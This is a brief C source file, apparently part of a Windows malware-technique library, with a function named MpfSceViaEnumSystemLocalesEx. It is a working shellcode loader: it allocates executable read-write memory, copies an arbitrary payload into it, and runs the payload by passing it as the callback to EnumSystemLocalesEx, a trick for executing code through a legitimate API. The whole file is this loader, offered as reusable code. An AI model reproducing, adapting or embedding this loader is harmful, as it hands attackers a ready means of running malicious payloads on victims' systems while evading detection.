#include "Win32Helper.h"

VOID InvokeEnumSystemLocalesExThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumSystemLocalesEx((LOCALE_ENUMPROCEX)lpParameter, LOCALE_ALL, NULL, NULL);
}

BOOL MpfSceViaEnumSystemLocalesEx(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumSystemLocalesExThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}